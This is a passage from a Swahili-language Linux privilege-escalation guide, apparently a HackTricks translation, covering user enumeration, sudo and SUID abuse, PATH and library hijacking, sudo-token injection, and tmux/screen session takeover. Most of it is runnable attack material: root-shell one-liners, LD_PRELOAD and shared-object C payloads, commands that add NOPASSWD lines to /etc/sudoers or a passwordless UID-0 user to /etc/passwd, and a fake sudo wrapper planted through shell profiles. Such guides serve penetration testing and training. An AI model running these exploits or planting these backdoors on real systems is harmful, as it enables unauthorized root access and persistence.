(netstat -punta || ss --ntpu) | grep "127.0"
```
### Sniffing

Angalia kama unaweza kunusa trafiki. Ikiwa unaweza, unaweza kuwa na uwezo wa kupata baadhi ya akidi.
```
timeout 1 tcpdump
```
## Users

### Generic Enumeration

Angalia **nani** ulivyo, ni **mamlaka** gani ulizonazo, ni **watumiaji** gani wako kwenye mifumo, ni yupi anaweza **kuingia** na ni yupi ana **mamlaka ya root:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### Big UID

Baadhi ya toleo za Linux zilipata hitilafu inayowaruhusu watumiaji wenye **UID > INT_MAX** kupandisha mamlaka. Maelezo zaidi: [here](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [here](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [here](https://twitter.com/paragonsec/status/1071152249529884674).\
**Itekeleze** kwa kutumia: **`systemd-run -t /bin/bash`**

### Groups

Angalia kama wewe ni **mwanachama wa kundi lolote** ambalo linaweza kukupa mamlaka ya root:

{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Angalia kama kuna kitu chochote cha kuvutia kilichoko ndani ya clipboard (ikiwa inawezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Known passwords

Ikiwa unajua **nenosiri lolote** la mazingira, **jaribu kuingia kama kila mtumiaji** ukitumia nenosiri hilo.

### Su Brute

Ikiwa hujali kufanya kelele nyingi na `su` na `timeout` binaries zipo kwenye kompyuta, unaweza kujaribu kujaribu nguvu mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) kwa kutumia parameter `-a` pia jaribu kujaribu nguvu watumiaji.

## Writable PATH abuses

### $PATH

Ikiwa unapata kwamba unaweza **kuandika ndani ya folda fulani ya $PATH**, unaweza kuwa na uwezo wa kupandisha mamlaka kwa **kuunda backdoor ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji tofauti (root kwa njia bora) na ambayo **haitapakiwa kutoka folda ambayo iko kabla** ya folda yako inayoweza kuandikwa katika $PATH.

### SUDO and SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au zinaweza kuwa na bit ya suid. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa zinakuwezesha kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Mkonfigu wa Sudo unaweza kumruhusu mtumiaji kutekeleza amri fulani kwa kutumia mamlaka ya mtumiaji mwingine bila kujua nenosiri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu, mtumiaji `demo` anaweza kukimbia `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ufunguo wa ssh kwenye saraka ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Hii amri inaruhusu mtumiaji **kuweka variable ya mazingira** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **uliotokana na mashine ya HTB Admirer**, ulikuwa **na udhaifu** wa **PYTHONPATH hijacking** ili kupakia maktaba ya python isiyo na mipaka wakati wa kutekeleza skripti kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Jump** kusoma faili nyingine au kutumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya Sudo/SUID binary bila njia ya amri

Ikiwa **idhini ya sudo** imetolewa kwa amri moja **bila kubainisha njia**: _hacker10 ALL= (root) less_ unaweza kuitumia kwa kubadilisha mabadiliko ya PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
H technique hii inaweza pia kutumika ikiwa **suid** binary **inaendesha amri nyingine bila kubainisha njia yake (daima angalia na** _**strings**_ **maudhui ya SUID binary isiyo ya kawaida)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary yenye njia ya amri

Ikiwa **suid** binary **inaendesha amri nyingine ikibainisha njia**, basi, unaweza kujaribu **kutoa kazi** iliyo na jina kama amri ambayo faili la suid linaita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda kazi hiyo na kuisafirisha:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Kisha, unapoitwa binary ya suid, kazi hii itatekelezwa

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** kinatumika kubaini maktaba moja au zaidi za pamoja (.so files) ambazo zitapakiwa na loader kabla ya zingine zote, ikiwa ni pamoja na maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama kupakia maktaba kabla.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumika vibaya, hasa na **suid/sgid** executable, mfumo unatekeleza masharti fulani:

- Loader inapuuzilia mbali **LD_PRELOAD** kwa executable ambapo kitambulisho halisi cha mtumiaji (_ruid_) hakilingani na kitambulisho cha mtumiaji kinachofanya kazi (_euid_).
- Kwa executable zenye suid/sgid, maktaba pekee katika njia za kawaida ambazo pia ni suid/sgid ndizo zinazopakiwa kabla.

Kuongezeka kwa mamlaka kunaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha taarifa **env_keep+=LD_PRELOAD**. Mipangilio hii inaruhusu kigezo cha mazingira **LD_PRELOAD** kudumu na kutambuliwa hata wakati amri zinapotekelezwa kwa kutumia `sudo`, ambayo inaweza kusababisha utekelezaji wa msimbo usio na mipaka kwa mamlaka yaliyoongezeka.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **jumuisha** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **pandisha mamlaka** ukikimbia
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc kama hii inaweza kutumika vibaya ikiwa mshambuliaji anadhibiti **LD_LIBRARY_PATH** env variable kwa sababu anadhibiti njia ambapo maktaba zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wakati wa kukutana na binary yenye ruhusa za **SUID** ambazo zinaonekana zisizo za kawaida, ni mazoea mazuri kuthibitisha ikiwa inapakua faili za **.so** ipasavyo. Hii inaweza kuangaliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunapendekeza uwezekano wa unyakuzi.

Ili kutumia hii, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Hii code, mara tu inapoandikwa na kutekelezwa, inalenga kuinua mamlaka kwa kubadilisha ruhusa za faili na kutekeleza shell yenye mamlaka yaliyoimarishwa.

Andika faili hii ya C kuwa faili ya kitu kilichoshirikiwa (.so) kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha SUID binary iliyoathiriwa kunapaswa kuanzisha exploit, kuruhusu uwezekano wa kuathiriwa kwa mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumepata binary ya SUID inayopakia maktaba kutoka kwa folda ambapo tunaweza kuandika, hebu tuunde maktaba katika folda hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
hii inamaanisha kwamba maktaba uliyounda inahitaji kuwa na kazi inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji ili kupita vizuizi vya usalama wa ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa kesi ambapo unaweza **tu kuingiza hoja** katika amri.

Mradi huu unakusanya kazi halali za Unix binaries ambazo zinaweza kutumika vibaya kuvunja shell zilizozuiliwa, kupandisha au kudumisha haki za juu, kuhamasisha faili, kuanzisha shell za bind na reverse, na kuwezesha kazi nyingine za baada ya unyakuzi.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{{#ref}}
https://gtfobins.github.io/
{{#endref}}

{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ikiwa unaweza kufikia `sudo -l` unaweza kutumia chombo [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa kinapata jinsi ya kutumia sheria yoyote ya sudo.

### Kuendelea Kutumia Token za Sudo

Katika kesi ambapo una **sudo access** lakini si nenosiri, unaweza kupandisha haki kwa **kusubiri utekelezaji wa amri ya sudo kisha kuingilia kati token ya kikao**.

Mahitaji ya kupandisha haki:

- Tayari una shell kama mtumiaji "_sampleuser_"
- "_sampleuser_" amekuwa **ameitisha `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa kawaida hiyo ndiyo muda wa token ya sudo inayoturuhusu kutumia `sudo` bila kuingiza nenosiri lolote)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuweza kuipakia)

(Unaweza kuwezesha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kubadilisha kwa kudumu `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji haya yote yanakidhi, **unaweza kupandisha haki kwa kutumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **unyakuzi wa kwanza** (`exploit.sh`) utaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia **kuamsha token ya sudo katika kikao chako** (hutaweza kupata shell ya root moja kwa moja, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- The **second exploit** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- The **third exploit** (`exploit_v3.sh`) itaunda **faili la sudoers** ambalo linafanya **tokens za sudo kuwa za milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ikiwa una **idhini za kuandika** katika folda au kwenye faili zozote zilizoundwa ndani ya folda hiyo unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda token ya sudo kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kufuta faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo mwenye PID 1234, unaweza **kupata mamlaka ya sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili ndani ya `/etc/sudoers.d` zinaweka mipangilio ya nani anaweza kutumia `sudo` na jinsi. Faili hizi **kwa kawaida zinaweza kusomwa tu na mtumiaji root na kundi root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata taarifa za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kuinua mamlaka**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna mbadala kadhaa ya binary ya `sudo` kama `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida anajiunganisha na mashine na anatumia `sudo`** kuongeza mamlaka na umepata shell ndani ya muktadha wa mtumiaji huyo, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza msimbo wako kama root na kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kuongeza njia mpya katika .bash_profile) ili wakati mtumiaji anatekeleza sudo, executable yako ya sudo itatekelezwa.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (sio bash) utahitaji kubadilisha faili nyingine kuongeza njia mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **mahali ambapo faili za usanidi zilizoloadiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaelekeza kwenye folda nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kwamba mfumo utafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye yoyote ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kupandisha hadhi.\
Angalia **jinsi ya kutumia makosa haya ya usanidi** kwenye ukurasa ufuatao:

{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib kwenye `/var/tmp/flag15/`, itatumika na programu mahali hapa kama ilivyoainishwa katika mabadiliko ya `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha tengeneza maktaba mbaya katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Linux capabilities hutoa **sehemu ya ruhusa za mizizi zinazopatikana kwa mchakato**. Hii kwa ufanisi inavunja ruhusa za mizizi **kuwa vitengo vidogo na tofauti**. Kila moja ya vitengo hivi inaweza kisha kutolewa kwa uhuru kwa michakato. Kwa njia hii, seti kamili ya ruhusa inapunguzwa, ikipunguza hatari za unyakuzi.\
Soma ukurasa ufuatao ili **ujifunze zaidi kuhusu uwezo na jinsi ya kuyatumia vibaya**:

{{#ref}}
linux-capabilities.md
{{#endref}}

## Ruhusa za Katalogi

Katika katalogi, **bit ya "tekeleza"** inaashiria kwamba mtumiaji aliyeathiriwa anaweza "**cd**" ndani ya folda.\
Bit ya **"soma"** inaashiria kwamba mtumiaji anaweza **orodhesha** **faili**, na bit ya **"andika"** inaashiria kwamba mtumiaji anaweza **futa** na **unda** **faili** mpya.

## ACLs

Orodha za Udhibiti wa Ufikiaji (ACLs) zinawakilisha safu ya pili ya ruhusa za hiari, zinazoweza **kuzidi ruhusa za jadi za ugo/rwx**. Ruhusa hizi zinaboresha udhibiti juu ya ufikiaji wa faili au katalogi kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kundi. Kiwango hiki cha **ukamilifu kinahakikisha usimamizi sahihi wa ufikiaji**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Patia** mtumiaji "kali" ruhusa za kusoma na kuandika juu ya faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACL maalum kutoka kwa mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua vikao vya shell

Katika **toleo za zamani** unaweza **kudhibiti** baadhi ya **vikao** vya mtumiaji mwingine (**root**).\
Katika **toleo za hivi karibuni** utaweza **kuungana** na vikao vya skrini tu vya **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **habari za kuvutia ndani ya kikao**.

### kudhibiti vikao vya skrini

**Orodha ya vikao vya skrini**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Unganisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Hii ilikuwa shida na **matoleo ya zamani ya tmux**. Sikuweza kuhamasisha kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na mamlaka.

**Orodha ya vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Unganisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Mfunguo wote wa SSL na SSH ulioanzishwa kwenye mifumo ya msingi ya Debian (Ubuntu, Kubuntu, nk) kati ya Septemba 2006 na Mei 13, 2008 unaweza kuathiriwa na hitilafu hii.\
Hitilafu hii inasababishwa wakati wa kuunda funguo mpya za ssh katika mifumo hiyo, kwani **mabadiliko 32,768 pekee yalikuwa yanawezekana**. Hii inamaanisha kwamba uwezekano wote unaweza kuhesabiwa na **ikiwa una funguo ya umma ya ssh unaweza kutafuta funguo ya faragha inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Inaeleza ikiwa uthibitishaji wa nenosiri unaruhusiwa. Kiwango cha kawaida ni `no`.
- **PubkeyAuthentication:** Inaeleza ikiwa uthibitishaji wa funguo za umma unaruhusiwa. Kiwango cha kawaida ni `yes`.
- **PermitEmptyPasswords**: Wakati uthibitishaji wa nenosiri unaruhusiwa, inaeleza ikiwa seva inaruhusu kuingia kwenye akaunti zenye nywila tupu. Kiwango cha kawaida ni `no`.

### PermitRootLogin

Inaeleza ikiwa root anaweza kuingia kwa kutumia ssh, kiwango cha kawaida ni `no`. Thamani zinazowezekana:

- `yes`: root anaweza kuingia kwa kutumia nenosiri na funguo ya faragha
- `without-password` au `prohibit-password`: root anaweza kuingia tu kwa funguo ya faragha
- `forced-commands-only`: Root anaweza kuingia tu kwa kutumia funguo ya faragha na ikiwa chaguo za amri zimeelezwa
- `no` : hapana

### AuthorizedKeysFile

Inaeleza faili ambazo zinafunguo za umma ambazo zinaweza kutumika kwa uthibitishaji wa mtumiaji. Inaweza kuwa na alama kama `%h`, ambayo itabadilishwa na saraka ya nyumbani. **Unaweza kuashiria njia kamili** (zinazoanzia `/`) au **njia za kulinganisha kutoka nyumbani kwa mtumiaji**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Iyo usanidi utaonyesha kwamba ikiwa unajaribu kuingia na **funguo** ya mtumiaji "**testusername**" ssh italinganisha funguo za umma za funguo zako na zile zilizoko katika `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding inakuwezesha **kutumia funguo zako za SSH za ndani badala ya kuacha funguo** (bila nywila!) zikiwa kwenye seva yako. Hivyo, utaweza **kuruka** kupitia ssh **kwenda kwenye mwenyeji** na kutoka pale **kuruka kwenye mwenyeji mwingine** **ukitumia** **funguo** iliyoko kwenye **mwenyeji wako wa awali**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` kama ifuatavyo:
```
Host example.com
ForwardAgent yes
```
Kumbuka kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anahamia kwenye mashine tofauti, mwenyeji huyo atakuwa na uwezo wa kufikia funguo (ambayo ni suala la usalama).

Faili `/etc/ssh_config` inaweza **kufuta** hizi **chaguzi** na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukataa** uhamasishaji wa ssh-agent kwa kutumia neno muhimu `AllowAgentForwarding` (kawaida ni ruhusa).

Ikiwa unapata kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kama **unaweza kuweza kuitumia vibaya ili kupandisha mamlaka**:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Faili za Kuvutia

### Faili za Profaili

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts ambazo zinafanywa wakati mtumiaji anapokimbia shell mpya**. Hivyo, ikiwa unaweza **kuandika au kubadilisha yoyote yao unaweza kupandisha mamlaka**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ikiwa kuna skripti za wasifu zisizo za kawaida, unapaswa kuziangalia kwa **maelezo nyeti**.

### Faili za Passwd/Shadow

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa na jina tofauti au kuna nakala ya akiba. Kwa hivyo inashauriwa **kupata zote** na **kuangalia kama unaweza kusoma** ili kuona **kama kuna hash** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Katika baadhi ya matukio unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au sawa na hiyo)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

Kwanza, tengeneza nenosiri kwa kutumia moja ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na ongeza nenosiri lililotengenezwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa dummy bila nenosiri.\
WARNING: unaweza kudhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: Katika majukwaa ya BSD, `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina jipya kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika katika **faili ya usanidi wa huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha **tomcat** server na unaweza **kubadilisha faili la usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor will be executed the next time that tomcat is started.

### Check Folders

The following folders may contain backups or interesting information: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Labda huwezi kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali ya Ajabu/Faida za Faili
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
